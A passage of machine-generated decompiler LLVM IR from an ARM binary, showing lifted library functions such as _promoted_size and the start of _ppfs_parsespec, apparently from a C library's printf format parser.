  %v1_11a20 = add i32 %v0_11a20, 8
  store i32 %v1_11a20, i32* %ip.global-to-local, align 4
  %v0_11a24.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_11a28.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11a24

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11960, %dec_label_pc_11a20
  %v0_11a28 = phi i32 [ %v0_11a2825, %dec_label_pc_11960 ], [ %v0_11a28.pre, %dec_label_pc_11a20 ]
  %v0_11a24 = phi i32 [ %v1_1196024, %dec_label_pc_11960 ], [ %v0_11a24.pre, %dec_label_pc_11a20 ]
  %v1_11a24 = add i32 %v0_11a24, 1
  store i32 %v1_11a24, i32* %lr.global-to-local, align 4
  %v1_11a28 = add i32 %v0_11a28, 28
  %v2_11a28 = inttoptr i32 %v1_11a28 to i32*
  %v3_11a28 = load i32, i32* %v2_11a28, align 4
  store i32 %v3_11a28, i32* %r3.global-to-local, align 4
  %v5_11a30 = icmp slt i32 %v1_11a24, %v3_11a28
  br i1 %v5_11a30, label %dec_label_pc_11960, label %dec_label_pc_11a28.dec_label_pc_11a34.loopexit_crit_edge

dec_label_pc_11a38:                               ; preds = %entry
  br i1 %v6_11914, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11a38
  %v2_11a3c = add i32 %v0_118fc, 36
  %v3_11a3c = inttoptr i32 %v2_11a3c to i8*
  %v4_11a3c = load i8, i8* %v3_11a3c, align 1
  %v5_11a3c = zext i8 %v4_11a3c to i32
  %v5_11a40 = mul nuw nsw i32 %v5_11a3c, 8
  %v6_11a40 = add i32 %v5_11a40, %v1_11908
  store i32 %v6_11a40, i32* %r3.global-to-local, align 4
  %v2_11a44 = add i32 %v6_11a40, -8
  %v3_11a44 = inttoptr i32 %v2_11a44 to i32*
  %v4_11a44 = load i32, i32* %v3_11a44, align 4
  store i32 %v4_11a44, i32* %r3.global-to-local, align 4
  store i32 %v4_11a44, i32* %v2_1190c, align 4
  %v0_11a4c.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11a38, %bb
  %v2_11a60 = phi i32 [ %v0_11a4c.pre, %bb ], [ %v0_118fc, %dec_label_pc_11a38 ]
  %v1_11a4c = add i32 %v2_11a60, 4
  %v2_11a4c = inttoptr i32 %v1_11a4c to i32*
  %v3_11a4c = load i32, i32* %v2_11a4c, align 4
  store i32 %v3_11a4c, i32* %r3.global-to-local, align 4
  %v6_11a50 = icmp eq i32 %v3_11a4c, -2147483648
  br i1 %v6_11a50, label %bb15, label %dec_label_pc_11a34

bb15:                                             ; preds = %.thread2
  %v2_11a54 = add i32 %v2_11a60, 37
  %v3_11a54 = inttoptr i32 %v2_11a54 to i8*
  %v4_11a54 = load i8, i8* %v3_11a54, align 1
  %v5_11a54 = zext i8 %v4_11a54 to i32
  %v1_11a58 = load i32, i32* %ip.global-to-local, align 4
  %v5_11a58 = mul nuw nsw i32 %v5_11a54, 8
  %v6_11a58 = add i32 %v5_11a58, %v1_11a58
  store i32 %v6_11a58, i32* %r3.global-to-local, align 4
  %v2_11a5c = add i32 %v6_11a58, -8
  %v3_11a5c = inttoptr i32 %v2_11a5c to i32*
  %v4_11a5c = load i32, i32* %v3_11a5c, align 4
  store i32 %v4_11a5c, i32* %r3.global-to-local, align 4
  store i32 %v4_11a5c, i32* %v2_11a4c, align 4
  %v0_11a64.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11a34

dec_label_pc_11a28.dec_label_pc_11a34.loopexit_crit_edge: ; preds = %dec_label_pc_11a24
  br label %dec_label_pc_11a34.loopexit

dec_label_pc_11a34.loopexit:                      ; preds = %dec_label_pc_11a28.dec_label_pc_11a34.loopexit_crit_edge, %dec_label_pc_11958
  %v0_11a28.lcssa = phi i32 [ %v0_11a28, %dec_label_pc_11a28.dec_label_pc_11a34.loopexit_crit_edge ], [ %v0_11a2818, %dec_label_pc_11958 ]
  br label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a34.loopexit, %.thread2, %bb15
  %v1_11a84 = phi i32 [ %v0_11a28.lcssa, %dec_label_pc_11a34.loopexit ], [ %v2_11a60, %.thread2 ], [ %v0_11a64.pre, %bb15 ]
  %v1_11a64 = add i32 %v1_11a84, 8
  %v2_11a64 = inttoptr i32 %v1_11a64 to i32*
  %v3_11a64 = load i32, i32* %v2_11a64, align 4
  store i32 %v3_11a64, i32* %r1.global-to-local, align 4
  %v1_11a68 = icmp slt i32 %v3_11a64, 0
  br i1 %v1_11a68, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_11a34
  %v5_11a6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_11a6c, i32* @r4, align 4
  ret i32 %v1_11a84

bb17:                                             ; preds = %dec_label_pc_11a34
  %v1_11a70 = add i32 %v1_11a84, 16
  %v2_11a70 = inttoptr i32 %v1_11a70 to i32*
  %v3_11a70 = load i32, i32* %v2_11a70, align 4
  %v1_11a78 = sub i32 0, %v3_11a64
  store i32 %v1_11a78, i32* %r1.global-to-local, align 4
  %v1_11a74 = and i32 %v3_11a70, -10
  %v1_11a7c = or i32 %v1_11a74, 8
  store i32 %v1_11a7c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_11a84 = add i32 %v1_11a84, 20
  %v3_11a84 = inttoptr i32 %v2_11a84 to i32*
  store i32 32, i32* %v3_11a84, align 4
  %v0_11a88 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a88 = load i32, i32* @r0, align 4
  %v2_11a88 = add i32 %v1_11a88, 8
  %v3_11a88 = inttoptr i32 %v2_11a88 to i32*
  store i32 %v0_11a88, i32* %v3_11a88, align 4
  %v0_11a8c = load i32, i32* %r3.global-to-local, align 4
  %v1_11a8c = load i32, i32* @r0, align 4
  %v2_11a8c = add i32 %v1_11a8c, 16
  %v3_11a8c = inttoptr i32 %v2_11a8c to i32*
  store i32 %v0_11a8c, i32* %v3_11a8c, align 4
  %v2_11a90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11a90, i32* @r4, align 4
  %v8_11a90 = load i32, i32* @r0, align 4
  ret i32 %v8_11a90

; uselistorder directives
  uselistorder i32 %v1_11a24, { 2, 1, 0 }
  uselistorder i32 %v0_11a28, { 1, 2, 0 }
  uselistorder i32 %v3_11970, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_11970, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_11964, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_1196024, { 1, 0 }
  uselistorder i32 %v0_11a2818, { 2, 0, 1 }
  uselistorder i32 %v0_118fc, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %lr.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 76, { 3, 4, 5, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_11a34, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_11a24, { 1, 0 }
  uselistorder label %dec_label_pc_11a20, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11a10, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_119f8, { 1, 0 }
  uselistorder label %dec_label_pc_119e4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_11960, { 1, 0 }
  uselistorder label %dec_label_pc_11958, { 1, 0 }
  uselistorder label %dec_label_pc_11934, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_11ab0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11a9c

dec_label_pc_11a9c:                               ; preds = %dec_label_pc_11ab8, %entry
  %v0_11a9c = phi i32 [ %v1_11a9c, %dec_label_pc_11ab8 ], [ ptrtoint (i32* @global_var_1d6dc.605 to i32), %entry ]
  %v1_11a9c = add i32 %v0_11a9c, -2
  %v1_11aa0 = add i32 %v0_11a9c, -1
  %v2_11aa0 = inttoptr i32 %v1_11aa0 to i8*
  %v3_11aa0 = load i8, i8* %v2_11aa0, align 1
  %v4_11aa0 = zext i8 %v3_11aa0 to i32
  %v1_11aa4 = inttoptr i32 %v1_11a9c to i8*
  %v2_11aa4 = load i8, i8* %v1_11aa4, align 2
  %v3_11aa4 = zext i8 %v2_11aa4 to i32
  %v3_11aa8 = mul nuw i32 %v4_11aa0, 16777216
  %v4_11aac = sdiv i32 %v3_11aa8, 65536
  %v5_11aac = or i32 %v4_11aac, %v3_11aa4
  %v9_11ab0 = icmp eq i32 %v5_11aac, %v1_11ab0.pre
  br i1 %v9_11ab0, label %dec_label_pc_11a9c.dec_label_pc_11ac4_crit_edge, label %dec_label_pc_11ab8

dec_label_pc_11a9c.dec_label_pc_11ac4_crit_edge:  ; preds = %dec_label_pc_11a9c
  br label %dec_label_pc_11ac4

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11a9c
  %tmp = icmp ugt i32 %v1_11a9c, ptrtoint (i32* @global_var_1d6c4.607 to i32)
  br i1 %tmp, label %dec_label_pc_11a9c, label %dec_label_pc_11ac4

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11ab8, %dec_label_pc_11a9c.dec_label_pc_11ac4_crit_edge
  %v2_11acc.pre-phi = sub i32 %v1_11a9c, ptrtoint (i32* @global_var_1d6c4.607 to i32)
  store i32 ptrtoint (i32* @global_var_1d6dc.605 to i32), i32* @r2, align 4
  %v4_11ad0 = sdiv i32 %v2_11acc.pre-phi, 2
  %v5_11ad0 = add i32 %v4_11ad0, ptrtoint (i32* @global_var_1d6dc.605 to i32)
  %v6_11ad0 = inttoptr i32 %v5_11ad0 to i8*
  %v7_11ad0 = load i8, i8* %v6_11ad0, align 1
  %v9_11ad0 = zext i8 %v7_11ad0 to i32
  ret i32 %v9_11ad0

; uselistorder directives
  uselistorder i32 %v1_11a9c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11a9c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d6dc.605 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11ae4 = load i32, i32* @r4, align 4
  store i32 %v3_11ae4, i32* %stack_var_-32, align 4
  %v6_11ae4 = load i32, i32* @r5, align 4
  %v25_11ae4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_11ae8 = add i32 %tmp, 16
  %v2_11ae8 = inttoptr i32 %v1_11ae8 to i32*
  %v3_11ae8 = load i32, i32* %v2_11ae8, align 4
  %v2_11aec = ptrtoint i32* %stack_var_-88 to i32
  %v1_11af0 = and i32 %v3_11ae8, 128
  store i32 %v1_11af0, i32* @r4, align 4
  %v2_11af0 = icmp eq i32 %v1_11af0, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_11b10 = add i32 %tmp, 24
  %v2_11b10 = inttoptr i32 %v1_11b10 to i32*
  %v3_11b10 = load i32, i32* %v2_11b10, align 4
  store i32 %v3_11b10, i32* %sb.global-to-local, align 4
  br i1 %v2_11af0, label %bb, label %dec_label_pc_11b30

bb:                                               ; preds = %entry
  %v3_11b14 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_11b7c

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11d00
  %v0_11b20 = load i32, i32* %r0.global-to-local, align 4
  %v0_11d30.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11d28

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11d2c
  %v1_11b28 = add i32 %v0_11d30.pre, 1
  store i32 %v1_11b28, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11d48

dec_label_pc_11b30:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b34

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11b68.dec_label_pc_11b34_crit_edge, %dec_label_pc_11b30
  %v1_11b44 = phi i32 [ %v1_11b58, %dec_label_pc_11b68.dec_label_pc_11b34_crit_edge ], [ 0, %dec_label_pc_11b30 ]
  %v0_11b34 = phi i32 [ %v0_11b34.pre, %dec_label_pc_11b68.dec_label_pc_11b34_crit_edge ], [ %tmp, %dec_label_pc_11b30 ]
  %v1_11b34 = inttoptr i32 %v0_11b34 to i32*
  %v2_11b34 = load i32, i32* %v1_11b34, align 4
  %v4_11b38 = mul i32 %v1_11b44, 4
  %v5_11b38 = add i32 %v2_11b34, %v4_11b38
  store i32 %v5_11b38, i32* %r3.global-to-local, align 4
  %v1_11b3c = add i32 %v5_11b38, -4
  %v2_11b3c = inttoptr i32 %v1_11b3c to i32*
  %v3_11b3c = load i32, i32* %v2_11b3c, align 4
  store i32 %v3_11b3c, i32* %r1.global-to-local, align 4
  store i32 %v25_11ae4, i32* %ip.global-to-local, align 4
  %v2_11b44 = add i32 %v1_11b44, %v25_11ae4
  store i32 %v2_11b44, i32* %r2.global-to-local, align 4
  %v1_11b48 = trunc i32 %v3_11b3c to i8
  %v3_11b48 = add i32 %v2_11b44, -56
  %v4_11b48 = inttoptr i32 %v3_11b48 to i8*
  store i8 %v1_11b48, i8* %v4_11b48, align 1
  %v0_11b4c = load i32, i32* %r2.global-to-local, align 4
  %v1_11b4c = add i32 %v0_11b4c, -56
  %v2_11b4c = inttoptr i32 %v1_11b4c to i8*
  %v3_11b4c = load i8, i8* %v2_11b4c, align 1
  %v4_11b4c = zext i8 %v3_11b4c to i32
  store i32 %v4_11b4c, i32* %r2.global-to-local, align 4
  %v0_11b50 = load i32, i32* %r3.global-to-local, align 4
  %v1_11b50 = add i32 %v0_11b50, -4
  %v2_11b50 = inttoptr i32 %v1_11b50 to i32*
  %v3_11b50 = load i32, i32* %v2_11b50, align 4
  store i32 %v3_11b50, i32* %r3.global-to-local, align 4
  %v9_11b54 = icmp eq i32 %v4_11b4c, %v3_11b50
  %v0_11b58 = load i32, i32* %r0.global-to-local, align 4
  %v1_11b58 = add i32 %v0_11b58, 1
  store i32 %v1_11b58, i32* %r0.global-to-local, align 4
  br i1 %v9_11b54, label %dec_label_pc_11b60, label %dec_label_pc_11f78

dec_label_pc_11b60:                               ; preds = %dec_label_pc_11b34
  %v2_11b60 = icmp eq i8 %v3_11b4c, 0
  br i1 %v2_11b60, label %dec_label_pc_11b70, label %dec_label_pc_11b68

dec_label_pc_11b68:                               ; preds = %dec_label_pc_11b60
  %tmp166 = icmp ult i32 %v1_11b58, 32
  br i1 %tmp166, label %dec_label_pc_11b68.dec_label_pc_11b34_crit_edge, label %dec_label_pc_11b70

dec_label_pc_11b68.dec_label_pc_11b34_crit_edge:  ; preds = %dec_label_pc_11b68
  %v0_11b34.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11b34

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b68, %dec_label_pc_11b60
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11b78 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_11b7c

dec_label_pc_11b7c:                               ; preds = %bb, %dec_label_pc_11b70
  %storemerge102 = phi i32 [ %v2_11b78, %dec_label_pc_11b70 ], [ %v3_11b14, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_11b8c

dec_label_pc_11b88:                               ; preds = %.thread22, %dec_label_pc_11c98
  %v0_11b88 = phi i32 [ %v2_11d10, %.thread22 ], [ %storemerge105, %dec_label_pc_11c98 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_11c98 ]
  store i32 %v0_11b88, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11b8c

dec_label_pc_11b8c:                               ; preds = %dec_label_pc_11b7c, %dec_label_pc_11b88
  %v1_11ba8 = phi i32 [ %storemerge102, %dec_label_pc_11b7c ], [ %v0_11b88, %dec_label_pc_11b88 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_11b7c ], [ %stack_var_-48.0, %dec_label_pc_11b88 ]
  %v1_11b8c = inttoptr i32 %v1_11ba8 to i8*
  %v2_11b8c = load i8, i8* %v1_11b8c, align 1
  %v3_11b8c = zext i8 %v2_11b8c to i32
  store i32 %v3_11b8c, i32* %r3.global-to-local, align 4
  %v7_11b90 = icmp eq i8 %v2_11b8c, 42
  br i1 %v7_11b90, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_11b8c
  store i32 %v1_11ba8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_11b8c
  %v1_11b9c = load i32, i32* @lr, align 4
  %v4_11b9c = mul i32 %v1_11b9c, -4
  %v5_11b9c = add i32 %v4_11b9c, %v25_11ae4
  store i32 %v5_11b9c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11ba8 = add i32 %v1_11ba8, 1
  store i32 %v2_11ba8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_11bb0 = add i32 %v5_11b9c, -12
  %v4_11bb0 = inttoptr i32 %v3_11bb0 to i32*
  store i32 0, i32* %v4_11bb0, align 4
  %v0_11bd4.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_11bd4.pre = phi i32 [ %v0_11bd4.pre.pre, %bb124 ], [ %v1_11ba8, %.thread9.thread ]
  %v2_11bd8.pre = load i32, i32* @global_var_2b898, align 4
  br label %.backedge

dec_label_pc_11bb8:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_11bbc = load i32, i32* %r0.global-to-local, align 4
  %v7_11bc0 = icmp sgt i32 %v0_11bbc, 4094
  br i1 %v7_11bc0, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_11bb8
  %v1_11bc814 = add i32 %v0_11c4c, 1
  store i32 %v1_11bc814, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_11bb8
  %v11_11bc4 = mul i32 %v0_11bbc, 10
  %v12_11bc4 = add i32 %v11_11bc4, %v3_11bd4
  store i32 %v12_11bc4, i32* %r3.global-to-local, align 4
  %v1_11bc8 = add i32 %v0_11c4c, 1
  store i32 %v1_11bc8, i32* %r6.global-to-local, align 4
  %v9_11bcc = add i32 %v12_11bc4, -48
  store i32 %v9_11bcc, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_11c4c = phi i32 [ %v0_11bd4.pre, %.preheader ], [ %v1_11bc8, %bb126 ], [ %v1_11bc814, %.thread12 ]
  store i32 178328, i32* %r3.global-to-local, align 4
  %v1_11bd4 = inttoptr i32 %v0_11c4c to i8*
  %v2_11bd4 = load i8, i8* %v1_11bd4, align 1
  %v3_11bd4 = zext i8 %v2_11bd4 to i32
  store i32 %v3_11bd4, i32* %r2.global-to-local, align 4
  store i32 %v2_11bd8.pre, i32* %r3.global-to-local, align 4
  %v3_11bdc = mul nuw nsw i32 %v3_11bd4, 2
  %v4_11bdc = add i32 %v3_11bdc, %v2_11bd8.pre
  %v5_11bdc = inttoptr i32 %v4_11bdc to i8*
  %v6_11bdc = load i8, i8* %v5_11bdc, align 1
  %v8_11bdc = zext i8 %v6_11bdc to i32
  store i32 %v8_11bdc, i32* %r3.global-to-local, align 4
  %v1_11be0 = and i32 %v8_11bdc, 8
  %v2_11be0 = icmp eq i32 %v1_11be0, 0
  br i1 %v2_11be0, label %dec_label_pc_11be8, label %dec_label_pc_11bb8

dec_label_pc_11be8:                               ; preds = %.backedge
  %v0_11be8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11be8 = add i32 %v0_11be8, -1
  %v2_11be8 = inttoptr i32 %v1_11be8 to i8*
  %v3_11be8 = load i8, i8* %v2_11be8, align 1
  %v4_11be8 = zext i8 %v3_11be8 to i32
  store i32 %v4_11be8, i32* %r3.global-to-local, align 4
  %v7_11bec = icmp eq i8 %v3_11be8, 37
  br i1 %v7_11bec, label %dec_label_pc_11bf4, label %dec_label_pc_11cb0

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11be8
  %v7_11bf4 = icmp eq i8 %v2_11bd4, 36
  %. = zext i1 %v7_11bf4 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_11c00 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_11c00, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_11bf4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11bf4, %bb130
  %v1_11c5c = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_11bf4 ]
  %v2_11c08 = icmp eq i32 %v1_11c5c, 0
  %v0_11c38 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_11c08, label %dec_label_pc_11c38, label %dec_label_pc_11c10

dec_label_pc_11c10:                               ; preds = %thread-pre-split
  %v2_11c38 = icmp eq i32 %v0_11c38, 0
  %v1_11c14 = add i32 %v0_11c4c, 1
  store i32 %v1_11c14, i32* %r1.global-to-local, align 4
  br i1 %v2_11c38, label %dec_label_pc_11f78, label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c10
  %v2_11c1c = sub i32 %v0_11c00, %v0_11c38
  %v4_11c1c = xor i32 %v0_11c38, %v0_11c00
  %v5_11c1c = xor i32 %v2_11c1c, %v0_11c00
  %v6_11c1c = and i32 %v5_11c1c, %v4_11c1c
  %v7_11c1c = icmp slt i32 %v6_11c1c, 0
  %v8_11c1c = icmp slt i32 %v2_11c1c, 0
  %v9_11c1c = icmp eq i32 %v0_11c00, %v0_11c38
  %v3_11c20 = xor i1 %v8_11c1c, %v7_11c1c
  %v4_11c20 = or i1 %v9_11c1c, %v3_11c20
  br i1 %v4_11c20, label %dec_label_pc_11c30, label %bb131

bb131:                                            ; preds = %dec_label_pc_11c1c
  store i32 %v0_11c00, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11c30

dec_label_pc_11c2c:                               ; preds = %dec_label_pc_11c4c, %dec_label_pc_11c54
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11c30

dec_label_pc_11c30:                               ; preds = %bb131, %dec_label_pc_11c1c, %dec_label_pc_11c2c
  %v0_11c30 = phi i32 [ %v0_11be8, %dec_label_pc_11c2c ], [ %v1_11c14, %dec_label_pc_11c1c ], [ %v1_11c14, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_11c2c ], [ %v0_11c00, %dec_label_pc_11c1c ], [ %v0_11c00, %bb131 ]
  br label %dec_label_pc_11c68

dec_label_pc_11c38:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_11c38, 1
  br i1 %tmp132, label %dec_label_pc_11c4c, label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %dec_label_pc_11c38
  %v7_11c40 = icmp eq i8 %v2_11bd4, 109
  br i1 %v7_11c40, label %dec_label_pc_11cb0, label %dec_label_pc_11f78

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11c38
  %tmp167 = icmp ugt i32 %v0_11c4c, %v0_11be8
  br i1 %tmp167, label %dec_label_pc_11c54, label %dec_label_pc_11c2c

dec_label_pc_11c54:                               ; preds = %dec_label_pc_11c4c
  %v1_11c54 = inttoptr i32 %v0_11be8 to i8*
  %v2_11c54 = load i8, i8* %v1_11c54, align 1
  %v3_11c54 = zext i8 %v2_11c54 to i32
  store i32 %v3_11c54, i32* %r3.global-to-local, align 4
  %v7_11c58 = icmp eq i8 %v2_11c54, 48
  br i1 %v7_11c58, label %dec_label_pc_11c2c, label %bb133

bb133:                                            ; preds = %dec_label_pc_11c54
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11cb0

dec_label_pc_11c68.loopexit:                      ; preds = %dec_label_pc_11c70
  %v1_11c7c = load i32, i32* @r4, align 4
  %v3_11c7c = or i32 %v1_11c7c, %v0_11c90
  store i32 %v3_11c7c, i32* @r4, align 4
  %v2_11c80 = add i32 %storemerge105, 1
  br label %dec_label_pc_11c68

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c68.loopexit, %dec_label_pc_11c30
  %storemerge105 = phi i32 [ %v0_11c30, %dec_label_pc_11c30 ], [ %v2_11c80, %dec_label_pc_11c68.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1d6bc.614 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_11c74 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_11c70

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11c88, %dec_label_pc_11c68
  %v0_11c90 = phi i32 [ %v2_11c90, %dec_label_pc_11c88 ], [ 1, %dec_label_pc_11c68 ]
  %v0_11c70 = phi i32 [ %v5_11c70, %dec_label_pc_11c88 ], [ ptrtoint ([8 x i8]* @global_var_1d6bc.614 to i32), %dec_label_pc_11c68 ]
  %v1_11c70 = inttoptr i32 %v0_11c70 to i8*
  %v2_11c70 = load i8, i8* %v1_11c70, align 1
  %v3_11c70 = zext i8 %v2_11c70 to i32
  store i32 %v3_11c70, i32* %r2.global-to-local, align 4
  %v5_11c70 = add i32 %v0_11c70, 1
  store i32 %v5_11c70, i32* %r1.global-to-local, align 4
  %v2_11c74 = load i8, i8* %v1_11c74, align 1
  %v3_11c74 = zext i8 %v2_11c74 to i32
  store i32 %v3_11c74, i32* %r3.global-to-local, align 4
  %v9_11c78 = icmp eq i8 %v2_11c74, %v2_11c70
  br i1 %v9_11c78, label %dec_label_pc_11c68.loopexit, label %dec_label_pc_11c88

dec_label_pc_11c88:                               ; preds = %dec_label_pc_11c70
  %v1_11c88 = inttoptr i32 %v5_11c70 to i8*
  %v2_11c88 = load i8, i8* %v1_11c88, align 1
  %v3_11c88 = zext i8 %v2_11c88 to i32
  store i32 %v3_11c88, i32* %r3.global-to-local, align 4
  %v2_11c8c = icmp eq i8 %v2_11c88, 0
  %v2_11c90 = mul i32 %v0_11c90, 2
  store i32 %v2_11c90, i32* %r0.global-to-local, align 4
  br i1 %v2_11c8c, label %dec_label_pc_11c98, label %dec_label_pc_11c70

dec_label_pc_11c98:                               ; preds = %dec_label_pc_11c88
  %v1_11c98 = add i32 %storemerge105, -1
  %v2_11c98 = inttoptr i32 %v1_11c98 to i8*
  %v3_11c98 = load i8, i8* %v2_11c98, align 1
  %v7_11c9c = icmp eq i8 %v3_11c98, 37
  %v0_11ca0 = load i32, i32* @r4, align 4
  %v1_11ca0 = and i32 %v0_11ca0, 10
  store i32 %v1_11ca0, i32* %r3.global-to-local, align 4
  %v4_11ca4 = udiv i32 %v1_11ca0, 2
  %v5_11ca4 = sub nuw nsw i32 -1, %v4_11ca4
  %v6_11ca4 = and i32 %v0_11ca0, %v5_11ca4
  store i32 %v6_11ca4, i32* @r4, align 4
  br i1 %v7_11c9c, label %dec_label_pc_11cac, label %dec_label_pc_11b88

dec_label_pc_11cac:                               ; preds = %dec_label_pc_11c98
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cb0

dec_label_pc_11cb0:                               ; preds = %bb133, %dec_label_pc_11be8, %dec_label_pc_11c40, %dec_label_pc_11cac
  %v1_11cf4 = phi i32 [ %storemerge105, %dec_label_pc_11cac ], [ %v0_11c4c, %bb133 ], [ %v0_11c4c, %dec_label_pc_11c40 ], [ %v0_11c4c, %dec_label_pc_11be8 ]
  %v0_11cf0 = phi i32 [ %v5_11c70, %dec_label_pc_11cac ], [ %v0_11be8, %bb133 ], [ %v0_11be8, %dec_label_pc_11c40 ], [ %v0_11be8, %dec_label_pc_11be8 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_11cac ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_11c40 ], [ %stack_var_-48.1, %dec_label_pc_11be8 ]
  %v1_11cb0 = inttoptr i32 %v0_11cf0 to i8*
  %v2_11cb0 = load i8, i8* %v1_11cb0, align 1
  %v3_11cb0 = zext i8 %v2_11cb0 to i32
  store i32 %v3_11cb0, i32* %r3.global-to-local, align 4
